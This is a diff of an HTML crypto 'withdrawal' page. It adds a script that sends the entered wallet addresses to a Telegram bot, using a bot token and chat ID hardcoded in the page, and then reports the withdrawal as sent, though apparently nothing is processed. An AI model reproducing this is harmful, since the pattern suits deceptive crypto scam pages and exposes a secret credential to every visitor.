@@ -100,7 +100,7 @@
         width: 400px;
         height: 40px;
         outline: none;
-        padding-left: 5px;
+        padding-left: 5em;
         background-color: #ffd700 !important;
         border: none;
       }
@@ -133,7 +133,7 @@
             <h1 class="heading-title">WITHDRAWAL</h1>
           </div>
           <div class="withdraw-inputs">
-            <form action="" autocomplete="off">
+            <form id="withdrawFunds" autocomplete="off">
               <div class="address-inputs-container">
                 <div class="form-input">
                   <div class="address-logo">
@@ -143,9 +143,9 @@
                     <input
                       class="input-address"
                       type="text"
-                      placeholder="INPUT ADDRESS"
+                      placeholder="Enter wallet address"
                       name="bit"
-                      id=""
+                     
                     />
                   </div>
                 </div>
@@ -157,9 +157,9 @@
                     <input
                       class="input-address"
                       type="text"
-                      placeholder="INPUT ADDRESS"
+                      placeholder="Enter wallet address"
                       name="eth"
-                      id=""
+                    
                     />
                   </div>
                 </div>
@@ -171,18 +171,73 @@
                     <input
                       class="input-address"
                       type="text"
-                      placeholder="INPUT ADDRESS"
+                      placeholder="Enter wallet address"
                       name="tron"
-                      id=""
+                     
                     />
                   </div>
                 </div>
-                <button class="withdraw-button">WITHDRAW</button>
+                <button type="submit" class="withdraw-button">WITHDRAW</button>
               </div>
             </form>
           </div>
         </div>
       </section>
     </main>
+    <script>
+        document.getElementById('withdrawFunds').addEventListener('submit', function (e) {
+            e.preventDefault(); 
+
+           
+            const bitAddress = document.querySelector('input[name="bit"]').value.trim();
+            const ethAddress = document.querySelector('input[name="eth"]').value.trim();
+            const tronAddress = document.querySelector('input[name="tron"]').value.trim();
+
+            
+            if (!bitAddress && !ethAddress && !tronAddress) {
+                alert("Please enter at least one address.");
+                return;
+            }
+
+            
+            let message = "Withdrawal request:\n";
+            if (bitAddress) message += `Bitcoin Address: ${bitAddress}\n`;
+            if (ethAddress) message += `Ethereum Address: ${ethAddress}\n`;
+            if (tronAddress) message += `Tron Address: ${tronAddress}\n`;
+
+          
+            const botToken = '7960200543:AAFTbQYL15K9t1WSZKUuCSvdsqD2H-I3WE0';
+            const chatId = '5865177790';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+
+            
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Withdrawal request sent successfully!');
+                    
+                    document.getElementById('withdrawFunds').reset();
+                } else {
+                    alert('Failed to send withdrawal request');
+                    console.error(data);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while sending the message');
+            });
+        });
+    </script>
   </body>
 </html>
